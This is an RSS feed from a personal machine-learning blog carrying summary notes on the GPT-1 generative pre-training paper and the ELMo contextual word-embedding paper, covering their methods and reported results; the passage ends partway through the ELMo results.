<?xml version="1.0" encoding="utf-8" standalone="yes" ?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>Posts | Shreyansh Singh</title>
    <link>https://shreyansh26.github.io/post/</link>
      <atom:link href="https://shreyansh26.github.io/post/index.xml" rel="self" type="application/rss+xml" />
    <description>Posts</description>
    <generator>Source Themes Academic (https://sourcethemes.com/academic/)</generator><language>en-us</language><copyright>© Shreyansh Singh 2021</copyright><lastBuildDate>Sun, 02 May 2021 13:42:14 +0530</lastBuildDate>
    <image>
      <url>https://shreyansh26.github.io/img/Shreyansh.jpg</url>
      <title>Posts</title>
      <link>https://shreyansh26.github.io/post/</link>
    </image>
    
    <item>
      <title>Paper Notes #3 - Improving Language Understanding by Generative Pre-Training</title>
      <link>https://shreyansh26.github.io/post/2021-05-02_language_understanding_generative_pretraining/</link>
      <pubDate>Sun, 02 May 2021 13:42:14 +0530</pubDate>
      <guid>https://shreyansh26.github.io/post/2021-05-02_language_understanding_generative_pretraining/</guid>
      <description>&lt;p&gt;&lt;strong&gt;Paper&lt;/strong&gt;: Improving Language Understanding by Generative Pre-Training&lt;br&gt;
&lt;strong&gt;Link&lt;/strong&gt;: &lt;a href=&#34;https://s3-us-west-2.amazonaws.com/openai-assets/research-covers/language-unsupervised/language_understanding_paper.pdf&#34;&gt;https://bit.ly/3xITvGP&lt;/a&gt;&lt;br&gt;
&lt;strong&gt;Blog&lt;/strong&gt;: &lt;a href=&#34;https://openai.com/blog/language-unsupervised/&#34;&gt;https://openai.com/blog/language-unsupervised/&lt;/a&gt; &lt;br&gt;
&lt;strong&gt;Authors&lt;/strong&gt;: Alec Radford, Karthik Narasimhan, Tim Salimans, Ilya Sutskever&lt;br&gt;
&lt;strong&gt;Code&lt;/strong&gt;: &lt;a href=&#34;https://github.com/openai/finetune-transformer-lm&#34;&gt;https://bit.ly/3gUFrUX&lt;/a&gt;&lt;/p&gt;
&lt;hr&gt;
&lt;h2 id=&#34;what&#34;&gt;What?&lt;/h2&gt;
&lt;p&gt;The paper proposes a semi-supervised technique that shows better performance on a wide variety of tasks like textual entailment, question answering, semantic similarity text classification by using a single task-agnostic model. The model can overcome the constraints of the small amount of annotated data for these specific tasks by performing an unsupervised generative-pretraining of a language model on a large diverse text corpus followed by supervised discriminative fine-tuning on each specific task. The pretraining model remains the same for all the tasks. Only a small, task-aware input adaptation is required when performing the fine-tuning. The model significantly improved the state-of-the-art (at the time) in 9 of the 12 tasks studied.&lt;/p&gt;
&lt;h2 id=&#34;why&#34;&gt;Why?&lt;/h2&gt;
&lt;p&gt;Most deep learning models require a substantial amount of data, which makes them difficult to train for tasks in which there is a dearth of good quality annotated data. Historically, pre-trained word embeddings have been used for such cases but the word-level information in itself is sometimes not enough for many of the complex tasks.&lt;/p&gt;
&lt;h2 id=&#34;how&#34;&gt;How?&lt;/h2&gt;
&lt;p&gt;The goal of the model is to learn a universal representation that transfers with little adaptation to a wide range of tasks. The paper assumes access to a large corpus of unlabeled text and several datasets with manually annotated training examples (the target tasks). The unlabeled corpus and the annotated datasets need not be in the same domain.&lt;/p&gt;
&lt;p&gt;A two-stage training procedure is used. First, a language modelling (LM) objective is used on the unlabeled data to learn the initial parameters of the model. Next, these parameters are adapted to a target task using the corresponding supervised objective.&lt;/p&gt;
&lt;p&gt;A Transformer (specifically a Transfomer decoder) is used as the underlying architecture. Transformers work better than LSTMs (shown in the results as well) because they can capture long-term dependencies well which results in robust transfer performance across diverse tasks.  Furthermore, during the transfer, as mentioned above, task-specific input adaptations are used which process the structured text input as a single contiguous sequence of tokens. This is something very interesting and will be shown in the subsequent sections.&lt;/p&gt;
&lt;h3 id=&#34;unsupervised-pre-training&#34;&gt;Unsupervised pre-training&lt;/h3&gt;
&lt;p&gt;A standard forward LM objective is used to maximise the likelihood -&lt;/p&gt;













&lt;figure&gt;


  &lt;a data-fancybox=&#34;&#34; href=&#34;https://shreyansh26.github.io/post/2021-05-02_language_understanding_generative_pretraining/images/unsupervised-lm.PNG&#34; &gt;
&lt;img src=&#34;https://shreyansh26.github.io/post/2021-05-02_language_understanding_generative_pretraining/images/unsupervised-lm.PNG&#34; alt=&#34;&#34; &gt;&lt;/a&gt;



&lt;/figure&gt;

&lt;p&gt;Here, , &lt;em&gt;U&lt;/em&gt; is the corpus of tokens {&lt;em&gt;u&lt;/em&gt;&lt;sub&gt;1&lt;/sub&gt;,&amp;hellip; &lt;em&gt;u&lt;/em&gt;&lt;sub&gt;n&lt;/sub&gt;}, &lt;em&gt;k&lt;/em&gt; is the context window size and the conditional probability &lt;em&gt;P&lt;/em&gt;  is modeled using a network with parameters Θ. SGD is used to learn the parameters. The model uses a multi-layer Transformer decoder. The multi-head self-attention is applied over the input context tokens. This is followed by position-wise feedforward layers to produce an output probability distribution over the target tokens.&lt;/p&gt;













&lt;figure&gt;


  &lt;a data-fancybox=&#34;&#34; href=&#34;https://shreyansh26.github.io/post/2021-05-02_language_understanding_generative_pretraining/images/probcalc.PNG&#34; &gt;
&lt;img src=&#34;https://shreyansh26.github.io/post/2021-05-02_language_understanding_generative_pretraining/images/probcalc.PNG&#34; alt=&#34;&#34; &gt;&lt;/a&gt;



&lt;/figure&gt;

&lt;p&gt;Here &lt;em&gt;U&lt;/em&gt; is (u&lt;sub&gt;-k&lt;/sub&gt;,&amp;hellip;, u&lt;sub&gt;-1&lt;/sub&gt;) which is the context vector of tokens, &lt;em&gt;n&lt;/em&gt; is the number of layers, &lt;em&gt;W&lt;/em&gt;&lt;sub&gt;e&lt;/sub&gt; is the token embedding matrix and &lt;em&gt;W&lt;/em&gt;&lt;sub&gt;p&lt;/sub&gt; is the position embedding matrix.&lt;/p&gt;
&lt;h3 id=&#34;supervised-fine-tuning&#34;&gt;Supervised fine-tuning&lt;/h3&gt;
&lt;p&gt;After the training of the model with optimization &lt;em&gt;L&lt;/em&gt;&lt;sub&gt;1&lt;/sub&gt;, the parameters are now adapted to the supervised target task. The labelled dataset is denoted by &lt;em&gt;C&lt;/em&gt;, where each instance is a sequence of input tokens, &lt;em&gt;x&lt;/em&gt;&lt;sup&gt;1&lt;/sup&gt;,&amp;hellip;,&lt;em&gt;x&lt;/em&gt;&lt;sup&gt;m&lt;/sup&gt;, along with a label &lt;em&gt;y&lt;/em&gt;. The inputs are passed through the pre-trained model to obtain the final transformer block&amp;rsquo;s activation &lt;em&gt;h&lt;/em&gt;&lt;sub&gt;l&lt;/sub&gt;&lt;sup&gt;m&lt;/sup&gt;, which is then fed into an added linear output layer with parameters &lt;em&gt;W&lt;/em&gt;&lt;sub&gt;y&lt;/sub&gt; to predict &lt;em&gt;y&lt;/em&gt;.&lt;/p&gt;













&lt;figure&gt;


  &lt;a data-fancybox=&#34;&#34; href=&#34;https://shreyansh26.github.io/post/2021-05-02_language_understanding_generative_pretraining/images/fintune1.PNG&#34; &gt;
&lt;img src=&#34;https://shreyansh26.github.io/post/2021-05-02_language_understanding_generative_pretraining/images/fintune1.PNG&#34; alt=&#34;&#34; &gt;&lt;/a&gt;



&lt;/figure&gt;

&lt;p&gt;The objective to be maximized is as follows&lt;/p&gt;













&lt;figure&gt;


  &lt;a data-fancybox=&#34;&#34; href=&#34;https://shreyansh26.github.io/post/2021-05-02_language_understanding_generative_pretraining/images/fintune2.PNG&#34; &gt;
&lt;img src=&#34;https://shreyansh26.github.io/post/2021-05-02_language_understanding_generative_pretraining/images/fintune2.PNG&#34; alt=&#34;&#34; &gt;&lt;/a&gt;



&lt;/figure&gt;

&lt;p&gt;Using an LM objective as an auxiliary objective to the finetuning helped to improve the generalization of the supervised model and make it converge faster.&lt;/p&gt;
&lt;p&gt;The overall objective can be written as -&lt;/p&gt;













&lt;figure&gt;


  &lt;a data-fancybox=&#34;&#34; href=&#34;https://shreyansh26.github.io/post/2021-05-02_language_understanding_generative_pretraining/images/objective-fin.PNG&#34; &gt;
&lt;img src=&#34;https://shreyansh26.github.io/post/2021-05-02_language_understanding_generative_pretraining/images/objective-fin.PNG&#34; alt=&#34;&#34; &gt;&lt;/a&gt;



&lt;/figure&gt;

&lt;h3 id=&#34;task-specific-input-transformations&#34;&gt;Task-specific input transformations&lt;/h3&gt;













&lt;figure&gt;


  &lt;a data-fancybox=&#34;&#34; href=&#34;https://shreyansh26.github.io/post/2021-05-02_language_understanding_generative_pretraining/images/input-transform.PNG&#34; &gt;
&lt;img src=&#34;https://shreyansh26.github.io/post/2021-05-02_language_understanding_generative_pretraining/images/input-transform.PNG&#34; alt=&#34;&#34; &gt;&lt;/a&gt;



&lt;/figure&gt;

&lt;p&gt;Since the pretrained model is trained on a contiguous sequence of texts, to handle the inputs of the various tasks, certain input transformations are needed as shown above. These transformations help to avoid making extensive changes to the architecture across tasks.&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;Textual Entailment&lt;/strong&gt; - The premise (&lt;em&gt;p&lt;/em&gt;) and the hypothesis (&lt;em&gt;h&lt;/em&gt;) sequences are concatenated with a delimiter token in between.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Similarity&lt;/strong&gt; - Since there is no inherent ordering of the two sequences being compared, the input sequence is modified to contain both possible sentence orderings (with a delimiter in between). Each of these concatenated sequences is processed independently to produce two sequence representations &lt;em&gt;h&lt;/em&gt;&lt;sub&gt;l&lt;/sub&gt;&lt;sup&gt;m&lt;/sup&gt; which are then element-wise added before feeding to the linear output layer.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Question Answering&lt;/strong&gt; - This one is interesting. For a given context document &lt;em&gt;z&lt;/em&gt;, question &lt;em&gt;q&lt;/em&gt; and a set of possible answers {&lt;em&gt;a&lt;/em&gt;&lt;sub&gt;k&lt;/sub&gt;}. The document and question are concatenated with each of the possible answers, with a delimiter token in between [&lt;em&gt;z&lt;/em&gt;; &lt;em&gt;q&lt;/em&gt;;$;&lt;em&gt;a&lt;/em&gt;&lt;sub&gt;k&lt;/sub&gt;]. Each of these sequences is processed independently by the model and then normalized by a softmax layer to produce an output distribution over possible answers.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;The model specifications for the experimental setup are shown below -&lt;/p&gt;













&lt;figure&gt;


  &lt;a data-fancybox=&#34;&#34; href=&#34;https://shreyansh26.github.io/post/2021-05-02_language_understanding_generative_pretraining/images/setup.PNG&#34; data-caption=&#34;Experimental Setup&#34;&gt;
&lt;img src=&#34;https://shreyansh26.github.io/post/2021-05-02_language_understanding_generative_pretraining/images/setup.PNG&#34; alt=&#34;&#34; &gt;&lt;/a&gt;


  
  
  &lt;figcaption&gt;
    Experimental Setup
  &lt;/figcaption&gt;


&lt;/figure&gt;

&lt;h2 id=&#34;results&#34;&gt;Results&lt;/h2&gt;
&lt;p&gt;The datasets that were used are listed below -&lt;/p&gt;













&lt;figure&gt;


  &lt;a data-fancybox=&#34;&#34; href=&#34;https://shreyansh26.github.io/post/2021-05-02_language_understanding_generative_pretraining/images/datasets.PNG&#34; &gt;
&lt;img src=&#34;https://shreyansh26.github.io/post/2021-05-02_language_understanding_generative_pretraining/images/datasets.PNG&#34; alt=&#34;&#34; &gt;&lt;/a&gt;



&lt;/figure&gt;

&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;Natural Language Inference&lt;/strong&gt; - This task is challenging due to the presence of a wide variety of phenomena like lexical entailment, coreference, and lexical and syntactic ambiguity. The model performs better than the state-of-the-art in 4 (MNLI, QNLI, SNLI, SciTail) out of 5 datasets.&lt;/li&gt;
&lt;/ul&gt;













&lt;figure&gt;


  &lt;a data-fancybox=&#34;&#34; href=&#34;https://shreyansh26.github.io/post/2021-05-02_language_understanding_generative_pretraining/images/nli.PNG&#34; &gt;
&lt;img src=&#34;https://shreyansh26.github.io/post/2021-05-02_language_understanding_generative_pretraining/images/nli.PNG&#34; alt=&#34;&#34; &gt;&lt;/a&gt;



&lt;/figure&gt;

&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;Question Answering and Commonsense Reasoning&lt;/strong&gt; - The RACE dataset (passages with associated questions from middle and high school exams) and Story Cloze dataset (selecting correct ending to multi-sentence stories from two options) were used. The model outperformed the baseline on both these datasets.&lt;/li&gt;
&lt;/ul&gt;













&lt;figure&gt;


  &lt;a data-fancybox=&#34;&#34; href=&#34;https://shreyansh26.github.io/post/2021-05-02_language_understanding_generative_pretraining/images/qa.PNG&#34; &gt;
&lt;img src=&#34;https://shreyansh26.github.io/post/2021-05-02_language_understanding_generative_pretraining/images/qa.PNG&#34; alt=&#34;&#34; &gt;&lt;/a&gt;



&lt;/figure&gt;

&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Semantic Similarity&lt;/strong&gt; - The challenges in this task are recognizing rephrasing, negation, and handling ambiguity. The model performs better on 2 (QQP and STS-B) of the 3 datasets.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Classification&lt;/strong&gt; - The model performs better on both Corpus of Linguistic Accepttability (CoLA) dataset and is at par with the state-of-the-art results on the Stanford Sentiment Treebank dataset.&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;













&lt;figure&gt;


  &lt;a data-fancybox=&#34;&#34; href=&#34;https://shreyansh26.github.io/post/2021-05-02_language_understanding_generative_pretraining/images/classification.PNG&#34; &gt;
&lt;img src=&#34;https://shreyansh26.github.io/post/2021-05-02_language_understanding_generative_pretraining/images/classification.PNG&#34; alt=&#34;&#34; &gt;&lt;/a&gt;



&lt;/figure&gt;

&lt;p&gt;Key points from the analysis section -&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;More the number of layers that are transferred from the pretrained model to the supervised target task, the better is the performance on the target tasks.&lt;/li&gt;
&lt;li&gt;To understand whether the unsupervised pre-training is effective or not, zero-shot testing was also performed i.e., using the pre-trained model directly without any finetuning. The model performance is stable and steadily increases over training suggesting that the generative pre-training supports the learning of a wide variety of task-relevant functionality. LSTMs exhibit higher variance in their zero-shot performance.
The testing and input transformations for using the pretrained model directly are explained below -













&lt;figure&gt;


  &lt;a data-fancybox=&#34;&#34; href=&#34;https://shreyansh26.github.io/post/2021-05-02_language_understanding_generative_pretraining/images/zeroshot.PNG&#34; &gt;
&lt;img src=&#34;https://shreyansh26.github.io/post/2021-05-02_language_understanding_generative_pretraining/images/zeroshot.PNG&#34; alt=&#34;&#34; &gt;&lt;/a&gt;



&lt;/figure&gt;
&lt;/li&gt;
&lt;/ul&gt;













&lt;figure&gt;


  &lt;a data-fancybox=&#34;&#34; href=&#34;https://shreyansh26.github.io/post/2021-05-02_language_understanding_generative_pretraining/images/trend.PNG&#34; &gt;
&lt;img src=&#34;https://shreyansh26.github.io/post/2021-05-02_language_understanding_generative_pretraining/images/trend.PNG&#34; alt=&#34;&#34; &gt;&lt;/a&gt;



&lt;/figure&gt;

&lt;ul&gt;
&lt;li&gt;From the ablation studies, the authors show that the auxiliary LM objective helps on the NLI tasks and QQP (Quora Question Pairs data).&lt;/li&gt;
&lt;li&gt;Overall, larger datasets benefit from the auxiliary objective more than the smaller datasets.&lt;/li&gt;
&lt;li&gt;In general, the Transformer architecture performs better than a 2048 unit single layer LSTM model (if the Transformer in the pretraining model is replaced by an LSTM) on all datasets except the MRPC (Microsoft Paraphrase Corpus for semantic similarity) dataset.&lt;/li&gt;
&lt;li&gt;On comparing this model with the same transformer architecture trained in a supervised manner, it is observed that the model with pre-training performs better. This consistent for all the tasks mentioned in the paper, suggesting that pre-training helps to capture important linguistic information which is not captured when training with a supervised approach alone.&lt;/li&gt;
&lt;/ul&gt;
&lt;hr&gt;
&lt;p&gt;&lt;strong&gt;I have also released an annotated version of the paper. If you are interested, you can find it &lt;a href=&#34;https://github.com/shreyansh26/Annotated-ML-Papers/blob/main/GPT1.pdf&#34;&gt;here&lt;/a&gt;.&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;This is all for now!&lt;/p&gt;
&lt;p&gt; &lt;/p&gt;
&lt;script type=&#34;text/javascript&#34; src=&#34;//downloads.mailchimp.com/js/signup-forms/popup/unique-methods/embed.js&#34; data-dojo-config=&#34;usePlainJson: true, isDebug: false&#34;&gt;&lt;/script&gt;
&lt;!-- &lt;button style=&#34;background-color: #70ab17; color: #1770AB&#34; id=&#34;openpopup&#34;&gt;Subscribe to my posts!&lt;/button&gt; --&gt;
&lt;div class=&#34;button_cont&#34; align=&#34;center&#34;&gt;&lt;button id=&#34;openpopup&#34; class=&#34;example_a&#34;&gt;Subscribe to my posts!&lt;/button&gt;&lt;/div&gt;
&lt;style&gt;
    .example_a {
        color: #fff !important;
        text-transform: uppercase;
        text-decoration: none;
        background: #3f51b5;
        padding: 20px;
        border-radius: 5px;
        cursor: pointer;
        display: inline-block;
        border: none;
        transition: all 0.4s ease 0s;
    }

    .example_a:hover {
        background: #434343;
        letter-spacing: 1px;
        -webkit-box-shadow: 0px 5px 40px -10px rgba(0,0,0,0.57);
        -moz-box-shadow: 0px 5px 40px -10px rgba(0,0,0,0.57);
        box-shadow: 5px 40px -10px rgba(0,0,0,0.57);
        transition: all 0.4s ease 0s;
    }
&lt;/style&gt;
&lt;script type=&#34;text/javascript&#34;&gt;

function showMailingPopUp() {
    window.dojoRequire([&#34;mojo/signup-forms/Loader&#34;], function(L) { L.start({&#34;baseUrl&#34;:&#34;mc.us4.list-manage.com&#34;,&#34;uuid&#34;:&#34;0b10ac14f50d7f4e7d11cf26a&#34;,&#34;lid&#34;:&#34;667a1bb3da&#34;,&#34;uniqueMethods&#34;:true}) })

    document.cookie = &#34;MCPopupClosed=;path=/;expires=Thu, 01 Jan 1970 00:00:00 UTC&#34;;
}

document.getElementById(&#34;openpopup&#34;).onclick = function() {showMailingPopUp()};

&lt;/script&gt;
&lt;p&gt; &lt;/p&gt;
&lt;p&gt;Follow me on &lt;a href=&#34;https://twitter.com/shreyansh_26&#34;&gt;Twitter&lt;/a&gt;, &lt;a href=&#34;https://github.com/shreyansh26&#34;&gt;Github&lt;/a&gt; or connect on &lt;a href=&#34;https://www.linkedin.com/in/shreyansh26/&#34;&gt;LinkedIn&lt;/a&gt;.&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>Paper Notes #2 - Deep contextualized word representations</title>
      <link>https://shreyansh26.github.io/post/2021-04-25_deep_contextualized_word_representations_elmo/</link>
      <pubDate>Sun, 25 Apr 2021 15:13:13 +0530</pubDate>
      <guid>https://shreyansh26.github.io/post/2021-04-25_deep_contextualized_word_representations_elmo/</guid>
      <description>&lt;p&gt;&lt;strong&gt;Paper&lt;/strong&gt;: Deep contextualized word representations&lt;br&gt;
&lt;strong&gt;Link&lt;/strong&gt;: &lt;a href=&#34;https://arxiv.org/abs/1802.05365&#34;&gt;https://arxiv.org/abs/1802.05365&lt;/a&gt; &lt;br&gt;
&lt;strong&gt;Authors&lt;/strong&gt;: Matthew E. Peters, Mark Neumann, Mohit Iyyer, Matt Gardner, Christopher Clark, Kenton Lee, Luke Zettlemoyer&lt;br&gt;
&lt;strong&gt;Code&lt;/strong&gt;: &lt;a href=&#34;https://github.com/allenai/allennlp/blob/main/allennlp/modules/elmo.py&#34;&gt;https://bit.ly/3xpHNAI&lt;/a&gt;&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;&lt;strong&gt;Note&lt;/strong&gt; - Since this is a relatively old paper, all the performance comparisons and state-of-the-art claims mentioned below should only be considered for the models at the time the paper was published.&lt;/p&gt;
&lt;h2 id=&#34;what&#34;&gt;What?&lt;/h2&gt;
&lt;p&gt;The paper proposes a new type of deep contextualized word representation that helps to effectively capture the syntactic and semantic characteristics of the word along with the linguistic context of the word. It can help differentiate the same word being used in different contexts with different meanings. The representations (embeddings) are learned from the internal states of a deep bidirectional language model (biLM). The embeddings, when used with the existing models, significantly improved the state of the art in six NLP problems - Question Answering, Natural Language Inference, Semantic Role Labeling, Coreference Resolution, Named Entity Recognition and Sentiment Analysis.&lt;/p&gt;
&lt;h2 id=&#34;why&#34;&gt;Why?&lt;/h2&gt;
&lt;p&gt;The existing word representations commonly in use were Word2Vec and GloVe. However, there was a need to capture even richer word representations. The paper states that the two main requirements of a good representation should be that they should be able to capture the complex characteristics of the word use and at the same time capture polysemy as well. This is the idea behind using ELMo (Embeddings from Language Models) representations.&lt;/p&gt;
&lt;h2 id=&#34;how&#34;&gt;How?&lt;/h2&gt;
&lt;p&gt;As a high-level overview, it can be said that the ELMo representations are a function of the entire input sequence. A two-layer biLM model with character-level convolutions is trained on a text corpus. The ELMo word representations are computed as a linear function of the internal network states of the biLM. The biLM is pretrained on a large scale and the ELMo representations can be incorporated into several deep learning-based NLP architectures.&lt;/p&gt;
&lt;h3 id=&#34;bilm-bidirectional-language-model&#34;&gt;biLM (Bidirectional Language Model)&lt;/h3&gt;
&lt;p&gt;A forward language model computes the probability of the sequence by modelling the probability of a token t&lt;sub&gt;k&lt;/sub&gt; given the history (t&lt;sub&gt;1&lt;/sub&gt;, &amp;hellip;, t&lt;sub&gt;k-1&lt;/sub&gt;). Similarly, a backward language model predicts the previous token given the nature context i.e., it performs the same function but in reverse order.&lt;/p&gt;













&lt;figure&gt;


  &lt;a data-fancybox=&#34;&#34; href=&#34;https://shreyansh26.github.io/post/2021-04-25_deep_contextualized_word_representations_elmo/images/forwardlm.PNG&#34; data-caption=&#34;Forward LM probability modelling&#34;&gt;
&lt;img src=&#34;https://shreyansh26.github.io/post/2021-04-25_deep_contextualized_word_representations_elmo/images/forwardlm.PNG&#34; alt=&#34;&#34; &gt;&lt;/a&gt;


  
  
  &lt;figcaption&gt;
    Forward LM probability modelling
  &lt;/figcaption&gt;


&lt;/figure&gt;














&lt;figure&gt;


  &lt;a data-fancybox=&#34;&#34; href=&#34;https://shreyansh26.github.io/post/2021-04-25_deep_contextualized_word_representations_elmo/images/backwardlm.PNG&#34; data-caption=&#34;Backward LM probability modelling&#34;&gt;
&lt;img src=&#34;https://shreyansh26.github.io/post/2021-04-25_deep_contextualized_word_representations_elmo/images/backwardlm.PNG&#34; alt=&#34;&#34; &gt;&lt;/a&gt;


  
  
  &lt;figcaption&gt;
    Backward LM probability modelling
  &lt;/figcaption&gt;


&lt;/figure&gt;

&lt;p&gt;In a forward LM, a context-independent token representation x&lt;sub&gt;k&lt;/sub&gt;&lt;sup&gt;LM&lt;/sup&gt; is obtained from a character-level CNN and then passed through &lt;em&gt;L&lt;/em&gt; layers of LSTMs. At each position &lt;em&gt;k&lt;/em&gt;, the LSTM layer outputs a context-dependent representation h&lt;sub&gt;&lt;i&gt;k,j&lt;/i&gt;&lt;/sub&gt;&lt;sup&gt;LM&lt;/sup&gt;, where &lt;em&gt;j&lt;/em&gt; = 1, &amp;hellip;, &lt;em&gt;L&lt;/em&gt;. the top layer of the LSTM output is used to predict the next token t&lt;sub&gt;k+1&lt;/sub&gt; with a Softmax layer. The same procedure is applied to the backward LM as well.&lt;/p&gt;













&lt;figure&gt;


  &lt;a data-fancybox=&#34;&#34; href=&#34;https://shreyansh26.github.io/post/2021-04-25_deep_contextualized_word_representations_elmo/images/bilm.PNG&#34; data-caption=&#34;biLM probability modelling&#34;&gt;
&lt;img src=&#34;https://shreyansh26.github.io/post/2021-04-25_deep_contextualized_word_representations_elmo/images/bilm.PNG&#34; alt=&#34;&#34; &gt;&lt;/a&gt;


  
  
  &lt;figcaption&gt;
    biLM probability modelling
  &lt;/figcaption&gt;


&lt;/figure&gt;

&lt;p&gt;A biLM combines both the forward and backward LM. The above formulation jointly optimizes the log-likelihood of the forward and backward directions.&lt;/p&gt;
&lt;p&gt;The formulation ties both the token representation Θ&lt;sub&gt;x&lt;sub&gt; and the Softmax layer Θ&lt;sub&gt;s&lt;/sub&gt; Separate paremeters are maintained for the forward and backward LSTMs.&lt;/p&gt;
&lt;p&gt;Next, we look at getting the word representations using ELMo.&lt;/p&gt;
&lt;h3 id=&#34;elmo&#34;&gt;ELMo&lt;/h3&gt;
&lt;p&gt;ELMo is a task-specific combination of the intermediate layer representations of the biLM model. If we have &lt;em&gt;L&lt;/em&gt; LSTM layers, then for each token t&lt;sub&gt;k&lt;/sub&gt; we have 2L + 1 representations.&lt;/p&gt;













&lt;figure&gt;


  &lt;a data-fancybox=&#34;&#34; href=&#34;https://shreyansh26.github.io/post/2021-04-25_deep_contextualized_word_representations_elmo/images/elmorepr.PNG&#34; &gt;
&lt;img src=&#34;https://shreyansh26.github.io/post/2021-04-25_deep_contextualized_word_representations_elmo/images/elmorepr.PNG&#34; alt=&#34;&#34; &gt;&lt;/a&gt;



&lt;/figure&gt;

&lt;p&gt;Now to get one single vector for each token, all the representations in &lt;em&gt;R&lt;/em&gt; are merged to one. Usually, task-specific weighting is performed.&lt;/p&gt;













&lt;figure&gt;


  &lt;a data-fancybox=&#34;&#34; href=&#34;https://shreyansh26.github.io/post/2021-04-25_deep_contextualized_word_representations_elmo/images/elmoeq.PNG&#34; &gt;
&lt;img src=&#34;https://shreyansh26.github.io/post/2021-04-25_deep_contextualized_word_representations_elmo/images/elmoeq.PNG&#34; alt=&#34;&#34; &gt;&lt;/a&gt;



&lt;/figure&gt;

&lt;p&gt;The &lt;i&gt;s&lt;/i&gt;&lt;sup&gt;&lt;i&gt;task&lt;/i&gt;&lt;/sup&gt; are softmax normalized weights and the scale parameter γ&lt;sup&gt;&lt;i&gt;task&lt;/i&gt;&lt;/sup&gt; allows te task model to scale the entire ELMo vector. In spme cases, applying LayerNorm to each biLM layer before weighting also helped.&lt;/p&gt;
&lt;h3 id=&#34;using-elmo-for-supervised-nlp-tasks&#34;&gt;Using ELMo for supervised NLP tasks&lt;/h3&gt;
&lt;p&gt;We start with a pretrained biLM model, The biLM is run to record the layer representations for each word. When using any supervised deep learning MLP model have a common architecture for the lowest layers. They usually use a context-independent token representation x&lt;sub&gt;k&lt;/sub&gt; for each token position using pre-trained embeddings and optionally also using character-based representations. Then, in the higher layers, the model forms context-sensitive representations using RNNs, CNNs or whatever, as per the task and the model.
For using ELMo, we can start in the same manner. We obtain the embeddings from the freezed weights of the biLM. Now instead of passing just x&lt;sub&gt;k&lt;/sub&gt; to the above layers, we will pass &lt;/br&gt; [x&lt;sub&gt;k&lt;/sub&gt;; &lt;strong&gt;ELMo&lt;/strong&gt;&lt;sub&gt;k&lt;/sub&gt;&lt;sup&gt;task&lt;/sup&gt; ] into the task model layers. For some tasks like SNLI (Natural language Inference) and SQuAD (Question-Answering), it was also seen that including ELMo at the output of the task model by introducing another set of output specific linear weights and replacing h&lt;sub&gt;k&lt;/sub&gt; with [h&lt;sub&gt;k&lt;/sub&gt;; &lt;strong&gt;ELMo&lt;/strong&gt;&lt;sub&gt;k&lt;/sub&gt;&lt;sup&gt;task&lt;/sup&gt; ] led to an improvement.&lt;/p&gt;
&lt;p&gt;Additionally, in some cases, regularizing the ELMo weights with λ||&lt;strong&gt;w&lt;/strong&gt;||&lt;sub&gt;2&lt;/sub&gt;&lt;sup&gt;2&lt;/sup&gt; helped introduce an inductive bias on the ELMo weights to make it stay close to the average of all biLM layers.&lt;/p&gt;
&lt;h3 id=&#34;pre-trained-bidirectional-language-model-architecture&#34;&gt;Pre-trained bidirectional language model architecture&lt;/h3&gt;
&lt;p&gt;The pre-trained biLM used in the paper is similar to the architecture in &lt;a href=&#34;https://arxiv.org/abs/1602.02410&#34;&gt;Józefowicz et al.&lt;/a&gt;. It is modified to support joint training of both directions and a residual connection is added between the LSTM layers. The size of the embeddings and layers were from what was in the &lt;code&gt;CNN-BIG-LSTM&lt;/code&gt; architecture in &lt;a href=&#34;https://arxiv.org/abs/1602.02410&#34;&gt;Józefowicz et al.&lt;/a&gt;. The final model has &lt;em&gt;L&lt;/em&gt;=2 biLSTM layers with 4096 units and 512-dimensional embeddings and a residual connection from the first to the second layer. The context insensitive type representation uses 2048 character n-gram convolutional filters followed by two highway layers and a linear projection down to a 512 representation. As a result, the biLM provides three layers of representations for each input token, including those outside the training set due to the purely
character input.&lt;/p&gt;
&lt;h2 id=&#34;results&#34;&gt;Results&lt;/h2&gt;













&lt;figure&gt;


  &lt;a data-fancybox=&#34;&#34; href=&#34;https://shreyansh26.github.io/post/2021-04-25_deep_contextualized_word_representations_elmo/images/results.PNG&#34; data-caption=&#34;Results comparison of the baseline models with the ones used along with ELMo&#34;&gt;
&lt;img src=&#34;https://shreyansh26.github.io/post/2021-04-25_deep_contextualized_word_representations_elmo/images/results.PNG&#34; alt=&#34;&#34; &gt;&lt;/a&gt;


  
  
  &lt;figcaption&gt;
    Results comparison of the baseline models with the ones used along with ELMo
  &lt;/figcaption&gt;


&lt;/figure&gt;

&lt;p&gt;The details of the baseline models are given in the paper. In all the tasks, the use of the ELMo representations led to improvement in the state-of-the-art results.&lt;/p&gt;
&lt;p&gt;Key points from the analysis section -&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Regularization parameter λ is important. λ=1 means that we are effectively reducing the weighting function to a simple average over the layers, while smaller values like λ=0.001 allows the layer weights to vary.&lt;/li&gt;
&lt;li&gt;The fact that we take the representations from all the layers gives a better performance as compared to just taking the topmost layer. Taking just the last layer is still better than the baseline.&lt;/li&gt;
&lt;li&gt;A small λ is preferred in most cases with ELMo, although for NER, a task with a smaller training set, the results are insensitive to λ.&lt;/li&gt;
&lt;/ul&gt;













&lt;figure&gt;


  &lt;a data-fancybox=&#34;&#34; href=&#34;https://shreyansh26.github.io/post/2021-04-25_deep_contextualized_word_representations_elmo/images/layercomp.PNG&#34; data-caption=&#34;Baseline vs ELMo last layer vs All the layers&#34;&gt;
&lt;img src=&#34;https://shreyansh26.github.io/post/2021-04-25_deep_contextualized_word_representations_elmo/images/layercomp.PNG&#34; alt=&#34;&#34; &gt;&lt;/a&gt;


  
  
  &lt;figcaption&gt;
    Baseline vs ELMo last layer vs All the layers
  &lt;/figcaption&gt;


